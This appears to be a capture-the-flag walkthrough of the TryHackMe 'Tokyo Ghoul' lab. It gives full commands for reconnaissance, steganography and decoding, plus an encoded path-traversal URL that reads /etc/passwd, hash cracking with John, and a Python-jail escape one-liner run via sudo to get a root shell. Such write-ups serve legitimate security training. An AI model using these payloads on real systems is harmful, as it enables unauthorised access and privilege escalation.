<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
            <h1 class="post-title entry-title">Tokyo Ghoul TryHackMe Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/tokyo-ghoul-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-04-10T10:27:10+00:00">April 10, 2021</time><time class="updated" datetime="2025-06-10T20:06:36+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Tokyo Ghoul “. It’s available at TryHackMe for penetration testing practice. This lab is of medium difficultly if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <span style="color: #0000ff;"><strong>devalfo </strong></span>and <span style="color: #0000ff;"><strong>rockyou.txt</strong></span>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;"><strong>Disclaimer: This Machine contains spoilers for the Tokyo Ghoul Anime and Manga. </strong></span></p>
<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Enumerating Source Code</span></li>
<li><span style="color: #000000;">Enumerating FTP Service</span></li>
<li><span style="color: #000000;">Enumerating Executable using Strings</span></li>
<li><span style="color: #000000;">Enumerating Image File using Steghide</span></li>
<li><span style="color: #000000;">Decoding Morse Code</span></li>
<li><span style="color: #000000;">Decoding Hexadecimal</span></li>
<li><span style="color: #000000;">Decoding Base64</span></li>
<li><span style="color: #000000;">Directory Bruteforce using Dirb</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Exploiting Local File Inclusion</span></li>
<li><span style="color: #000000;">Extracting User Hash</span></li>
<li><span style="color: #000000;">Cracking User Hash using John the Ripper</span></li>
<li><span style="color: #000000;">Logging in via SSH</span></li>
<li><span style="color: #000000;">Reading User Flag</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
<li><span style="color: #000000;">Escaping Python Jail using built-in modules</span></li>
<li><span style="color: #000000;">Exploiting Sudo Permissions on Python Script</span></li>
<li><span style="color: #000000;">Getting Root Shell</span></li>
<li><span style="color: #000000;">Reading Root Flag</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;">To read and understand what the machine is, we will be starting with reading the Lab Description:</span></p>
<p><span style="color: #000000;">“Help kaneki escape jason room”</span></p>
<p><span style="color: #000000;">“This room took a lot of inspiration from psychobreak , and it is based on Tokyo Ghoul anime.”</span></p>
<p><span style="color: #000000;">After Booting up the machine from the <span style="color: #0000ff;"><strong>TryHackMe: Tokyo Ghoul</strong></span> Page, we will be provided with a Target IP Address.</span></p>
<p><span style="color: #000000;"><strong>IP Address: 10.10.43.18</strong></span></p>
<p><span style="color: #000000;">This room has 2 flags that we need to find to complete the Machine. Although there are multiple questions or tasks that we need to perform. We will answer those tasks as we go through them.</span></p>
<p><span style="color: #000000;"><strong>Task 1:  About the room</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. Read the above</em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<ol start="2">
<li><span style="color: #000000;"><em> 2. Deploy the machine </em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">We will start with a nmap scan with -sC for Default Scripts and -sV for Scanning Versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.10.43.18</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sEB1ZUFa5hA/YHF4Y416-aI/AAAAAAAAvT0/Q0uWAoBZ3C80lbLylppXVDLvIBd2KS1OwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Nmap was able to identify 3 services running on the target machine. It included FTP (21), SSH (22) and HTTP (80). Nmap was kind enough to check the FTP service for Anonymous Login and it told us that there is a directory by the name of need_Help? Hosted on FTP server which is accessible through Anonymous Login. We will get back to that. The SSH Service is not accessible due to a lack of credentials. At last, we have the HTTP Service hosting some webpage.</span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">The webpage describes the story of Ken Kaneki a High School Teenager who went on a date with a girl Rize Kamishiro. She turned out to be a ghoul and started consuming Kaneki. But something falls on her and she is knocked out. Kaneki escapes to the hospital where he is captured by Jason. Jason used Kaneki for harvesting his organs. This is pretty dark if you ask me. Anyhow reading this possibly gave us some words that can either be directories or users on the machine. We have the Ken, Kaneki, Rize, Kamishiro and Jason. The webpage has a link that is to be used to save Kaneki from Jason. Clicking on it leads to another page. </span></p>
<p><span style="color: #000000;"><strong>Task 2:  Where am i?</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. Use nmap to scan all ports </em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<ol start="2">
<li><span style="color: #000000;"><em> 2. How many ports are open? </em></span></li>
</ol>
<p><span style="color: #000000;"><em>3</em></span></p>
<ol start="3">
<li><span style="color: #000000;"><em> 3. What is the OS used?</em></span></li>
</ol>
<p><span style="color: #000000;"><em>Ubuntu</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f79yz_lzeII/YHF4hevyOVI/AAAAAAAAvT4/7jLdRteIw-AX7B90USpvQkLRaPyLfIPIgCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">This page is called jasonroom.html. It contained a gif of Jason injecting Kaneki of some fluid. Tried to find some link or anything other than the gif on the page but we were unsuccessful. Inspecting the gif also resulted into a dead end. This is where it hit me to check the source code of the webpage.</span></p>
<p><span style="color: #000000;"><strong>Task 3:  Planning to escape</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. </em>Did you find the note that the others ghouls gave you? where did you find it?</span></li>
</ol>
<p><span style="color: #000000;">jasonroom.html</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/jasonroom.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-huw1OUasMF0/YHF4mDPyf7I/AAAAAAAAvT8/EGbmcQ43D2w5QpodQAHzdUbFccIsPY-_wCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">There is a comment on the webpage. It tells us that there is a way to escape Jason. Notes further tell us that there is a mask that makes us look <em>Anonymous</em> and it tells us to go to the FTP room. That is a lame hint. We already know that anonymous login is enabled on the FTP. Time to enumerate the FTP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.10.43.18/jasonroom.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nhG6-lK9CEI/YHF4rkiDXCI/AAAAAAAAvUE/dSUFh8dCT7Q4i_GTRrjrvZisD4D38t8ugCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Logging in on the FTP service we have the need_Help? Directory. It contained a text file (Aogiri_tree.txt) and another directory (Talk_with_me). We download the text file to our local system for a closer look and then we traversed into the Talk_with_me directory. It contained an executable binary need_to_talk and an image rize_and_kaneki.jpg. We download both of them to our local machine for further inspection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.10.43.18
anonymous
ls
cd need_Help?
ls
get Aogiri_tree.txt
cd Talk_with_me
ls
get need_to_talk
get rize_and_kaneki.jpg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--gf7SBGyhjU/YHF4xCk9p0I/AAAAAAAAvUM/XwqSOdtblkc17DubVRhfghk6_GGtomSsACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We read the Aogiri_tree.txt file. This seemed a message to Kaneki describing that Rize is now a part of Kaneki and Kaneki has her Kagune. It asks Kaneki to get control of his body and it also tells Kaneki that he is a part of Aogiri tree. Now we add two other words to our original notes. Kagune and Aogiri.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat Aogiri_tree.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nOPta4bfgng/YHF43Cmq3NI/AAAAAAAAvUU/RkYtD__hiCg_z5u4mLicrLgD7WuWf2r7ACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Another file that we downloaded from the FTP server is an image of Rize and Kaneki. We looked it in the Image Viewer and checked its details using the Exif tool. No important information recovered. This made us realize that it is possible that is a compressed file. That means we need to use steghide to extract it. We tried and told us that there is a password that needs to be entered in order to extract files inside the rize_and_kaneki.jpg.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uVIGCGetlMU/YHF4702giAI/AAAAAAAAvUc/DcLjYxUEalUfwmu8jEW5eJeXcrvmJIU6QCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Now we need to enumerate the password. We upgraded the permissions of the need_to_talk executable to run it on our local machine. It tells us that it will give us the kagune which we can only assume is the password for extracting files from the image. But in order to cough up the password, it requires us to enter a keyword. The puzzle inside a puzzle. Nice! We entered a password. Of course, it is not the correct keyword but it gave us a hint. It asks us to take a look inside the executable. There are a bunch of tools to take a look inside the executable such as rabin2 which it hints us to use, or we can use ltrace to, but the simplest of all is the strings. Let’s test strings first.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 need_to_talk  
./need_to_talk</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-csBrFim5Hu0/YHF5CJ1aKuI/AAAAAAAAvUk/9IKYmvcYRP4FgNtebFyczR03DR8_hCq2wCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Strings command extracts the human-readable words from the machine code. Now, as the executable asks for a particular keyword. It is possible that it might be running a string compare to the word and the word might exist inside the binary code. We see that Kamishiro exists inside the code. It was one of the words of interest that we are extracting from the beginning of the walkthrough too.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings need_to_talk</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TgiWzgi9TuU/YHF5HAmrLJI/AAAAAAAAvUo/7R4Pj-KHw1MEJsLDgUtks3xKTTDdBpu9QCLcBGAsYHQ/s16000/9.png"/></span></p>
<ol start="2">
<li><span style="color: #000000;"><em> 2. What is the key for Rize executable?</em></span></li>
</ol>
<p><span style="color: #000000;"><em>kamishiro</em></span></p>
<ol start="3">
<li><span style="color: #000000;"><em> 3. Use a tool to get the other note from Rize.</em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<p><span style="color: #000000;">We run the executable again. This time when asked for a keyword, we typed in Kamishiro. It tells us that we came for “You_found_1t”. Really! It seems like the author is not even trying to name files properly. Still, this seems like a troll and also a password that might extract data from the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./need_to_talk</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tSxw8rf1x5k/YHF5L0t4a2I/AAAAAAAAvUw/6zrqVDcz_AA8SWgKZ6skHAprdrmWGA4zQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">As we entered the You_found_1t while extracting the contents from the rize_and_kankeki.jpg. It extracts a text file “yougotme.txt”. Wow! such a talent naming files. Time to read the yougotme.txt. It mocks us for our smartness but then proceeds to give the most easily recognizable encoding language in the world. Morse Code. It hints that if we decode the Morse, we can get a directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">steghide extract -sf rize_and_kaneki.jpg    
cat yougotme.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mEln0Ppy5no/YHF5QIIgmVI/AAAAAAAAvU0/pWfn08SLKLU18IReQLdUKfO0_U2sorOkACLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">We searched for a Morse Code decoder online. Because we are not dense enough to resort to converting each dot and dashes. Any how it gets converted into a weird string. This string however looks too familiar.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MH3MHwEP5F4/YHF5U-otMBI/AAAAAAAAvU8/cE-e80H16gAeCGwquqGn6SRdBvuQPj8qgCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">We went on the asciitohex website and entered the string in the Hexadecimal section. It gets converted into another string. The == tells us this is Base64.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DqO46ZtYzgA/YHF5Zc_Th7I/AAAAAAAAvVA/mlZUhGxdWogFbJHWVLnGih7o_2OXJgEPwCLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Copying the sting and pasting inside the Base64 section we get ourselves the secret directory convincedly named d1r3c70ry_center.</span></p>
<p><span style="color: #000000;"><strong>Task 4:  What Rize is trying to say?</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. What the message mean did you understand it? what it says?</em></span></li>
</ol>
<p><span style="color: #000000;"><em>d1r3c70ry_center</em></span></p>
<ol start="2">
<li><span style="color: #000000;"><em> 2. Can you see the weakness in the dark? no? just search </em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<ol start="3">
<li><span style="color: #000000;"><em> 3. What did you find something? crack it</em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h7SrCkZmMXY/YHF5e27c7II/AAAAAAAAvVI/i9JoMsmFvYIyMrcKsic7Hz-Yjx2w2moJQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">We tried to browse the d1r3c70ry_center by carefully placing it next to the IP address of the target machine. It gave us this image of a character who is asking that we scan him. We will not disappoint him. There are a bunch of scans that we can do here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/d1r3c70ry_center/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gN5CHgmvNfs/YHF5jPLwyGI/AAAAAAAAvVQ/fcZxoM-P05YWvuo10avfYaRvW5uZyRw7wCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We decided to start with a dirb scan or a Directory Bruteforce. We used the common.txt as a wordlist for our scan. This gave us a directory by the name of the claim.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.43.18/d1r3c70ry_center/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YbTAqNcMuTo/YHF5oTGvanI/AAAAAAAAvVY/T-E6Wv5emisiC5uoBiIb5Mx7T4om6UzsACLcBGAsYHQ/s16000/16.1.png"/></span></p>
<p><span style="color: #000000;">Browsing the claim directory, we are greeted Welcome Kaneki Ken. It asks us a question if we really want the power? Are we going to accept this ghoul power? A simple yes and no question with yes and no buttons. We click on both sequentially to see what happens.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/d1r3c70ry_center/claim/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jJ9a-hLCTMs/YHF5wi4KR9I/AAAAAAAAvVg/MHaYlUyD-nIedhhCiwVlCwN6RdzcrPzqACLcBGAsYHQ/s16000/16.png"/></span></p>
<p><span style="color: #000000;">We are directed to viewing a gif. However, the gif was browsed using the view parameter. This makes us so eager to try Local File Inclusion.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=flower.gif</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7bL-vOCqbmQ/YHF52rRHJUI/AAAAAAAAvVk/wX9AO_mQ0QwosDbSP8DmbEVSrQR3CzRygCLcBGAsYHQ/s16000/17.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Exploitation</span> </strong></span></h3>
<p><span style="color: #000000;">We think the author of the machine has anticipated that as well. It politely asks us not to do it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=../../../../etc/passwd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3tTqPUIxaMk/YHF57BdeVjI/AAAAAAAAvVs/UUg6YxbCBBAv11drr-FKu95IIZVebpaFgCLcBGAsYHQ/s16000/18.png"/></span></p>
<p><span style="color: #000000;">But we are not going to back down so easily. We tried entering just dots and then with backslashes. This is where we see that it is restricting the backslashes. So, we encoded them and tried to browse the etc/passwd file again and this time we got success. We got the username and password hash. The user we will be using would be Kamishiro.</span></p>
<ol start="4">
<li><span style="color: #000000;"><em> 4. what is Rize username?</em></span></li>
</ol>
<p><span style="color: #000000;"><em>kamishiro</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.43.18/d1r3c70ry_center/claim/index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zW6QFfwDAiI/YHF6CyvpPgI/AAAAAAAAvV0/6nX3LtWuzxE-pYDkN1nFjLS1eKBZzu8VACLcBGAsYHQ/s16000/19.png"/></span></p>
<p><span style="color: #000000;">We copied the hash and pasted it into a file name hash. I think the author has rubbed us off that lazy file naming characteristic.  Anyways, we tried to crack the hash using John the Ripper. The wordlist we decided to use was rockyou.txt. The password cracked in mere seconds and came out to be password123. This is where I felt the most trolled by the author of the machine.</span></p>
<ol start="5">
<li><span style="color: #000000;"><em> 5. what is Rize password?</em></span></li>
</ol>
<p><span style="color: #000000;"><em>password123</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sLreGn2JBFw/YHF6IM9wHQI/AAAAAAAAvV4/7b7o3Ait4EkhaARvp8awhdfvRZALMborACLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">Time to connect to the target machine as Kamishiro user. Lucky for us there were not any new rabbit holes and we got the first flag on the machine i.e., User Flag. </span></p>
<p><span style="color: #000000;"><strong>Task 5:  Fight Jason</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. user.txt</em></span></li>
</ol>
<p><span style="color: #000000;"><em>###############################</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh kamishiro@10.10.43.18
ls
cat user.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MxN8NZrXxa4/YHF6QatEgmI/AAAAAAAAvWA/BEbOQOM3sscvwWDmOaFQq9GA1X1EFqCQQCLcBGAsYHQ/s16000/21.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">We need to enumerate the machine to find a way to elevate this shell to a root shell. We started by checking the sudo permissions for Kamishiro user. We see that we have a python script by the name of jail.py that we can run as root.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xxroiTDHOnw/YHF6U0MHwVI/AAAAAAAAvWI/2pdGzxwd8AM8RI2YZF-0Eb1762iOGOCOgCLcBGAsYHQ/s16000/22.png"/></span></p>
<p><span style="color: #000000;">During our hunt for user flag, we saw that jail.py exists in the current directory. Let’s take a look under the hood of this script to see its working. The script starts with a bunch of strings. Then it asks the user for input. But this input is then checked for keywords like ‘eval’, ‘exec’, ‘import’, ‘open’, ‘os’, ‘read’, ‘system’ and ‘write’. This means that we are restricted to execute any reverse shell script or bash script to get root. We need to get a bit creative here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat jail.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UlE1n3usWg8/YHF6YEaf_6I/AAAAAAAAvWM/OhCE-vQ35rgnKzujXTcqnTBp6Y_IqSz1gCLcBGAsYHQ/s16000/23.png"/></span></p>
<p><span style="color: #000000;">We needed a way to execute a command while evading the checks. Python allows us to define built-in objects as __builtins__modules. So instead of using import or os we will use __IMPORT__ and OS. We could have been at it to create a proper script and try it again and again on the script. But instead of reinventing the wheel, we decided to search for Python Jails and we got this <a style="color: #000000;" href="https://anee.me/escaping-python-jails-849c65cf306e">article</a> which has created the command that works to read a file. We modified it to invoke a shell. Since it is possible to run this script as root using sudo the shell that it will generate will be of root as well. After executing the script and providing the builtins command we got the root shell. Traversing inside the root directory we found the final flag i.e., Root Flag.</span></p>
<ol start="2">
<li><span style="color: #000000;"><em> 2. root.txt</em></span></li>
</ol>
<p><span style="color: #000000;"><em>###############################</em></span></p>
<p><span style="color: #000000;"><strong>Task 6: Special thanks</strong></span></p>
<ol>
<li><span style="color: #000000;"><em> 1. Congratulations you’ve complete Tokyo ghoul room 1</em></span></li>
</ol>
<p><span style="color: #000000;"><em>No answer needed</em></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/python3 /home/kamishiro/jail.py
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
id
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HE6SiyB5PaE/YHF6cMNy-gI/AAAAAAAAvWQ/pUyyCr70T1UMWp06ORyPeXjcjV_nlroqgCLcBGAsYHQ/s16000/24.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
